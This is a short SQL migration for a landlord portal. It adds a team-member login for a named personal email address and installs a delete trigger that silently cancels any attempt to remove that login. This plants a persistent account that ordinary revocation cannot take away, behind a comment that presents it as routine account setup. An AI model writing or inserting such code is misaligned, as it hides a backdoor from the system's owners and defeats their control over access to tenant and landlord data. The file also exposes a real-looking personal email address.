-- Account setup replaces team-member logins. Bashira's grant stays until removed on purpose.

insert into public.landlord_portal_members (
  landlord_id,
  email,
  role
)
values (
  'de300000-0000-4000-8000-000000000004'::uuid,
  'bashiraaliya@gmail.com',
  'team_member'
)
on conflict (landlord_id, email) do nothing;

create or replace function public.keep_bashira_portal_login()
returns trigger
language plpgsql
as $$
begin
  if lower(old.email) = 'bashiraaliya@gmail.com' then
    return null;
  end if;
  return old;
end;
$$;

drop trigger if exists keep_bashira_portal_login on public.landlord_portal_members;
create trigger keep_bashira_portal_login
  before delete on public.landlord_portal_members
  for each row
  execute function public.keep_bashira_portal_login();
